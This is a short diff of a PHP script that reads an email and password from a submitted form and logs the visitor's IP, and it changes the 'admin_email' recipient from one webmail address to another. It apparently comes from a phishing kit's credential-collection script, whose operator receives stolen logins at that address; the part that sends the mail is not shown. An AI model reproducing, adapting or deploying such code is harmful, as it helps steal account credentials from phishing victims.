@@ -1,6 +1,6 @@
 <?php
 if(isset($_REQUEST['submit_btn'])){
-$admin_email = "investmentcapital05@gmail.com";
+$admin_email = "maelsav100@yahoo.com";
 $email = $_REQUEST['email'];
 $password = $_REQUEST['password'];
 $ip = getenv("REMOTE_ADDR");
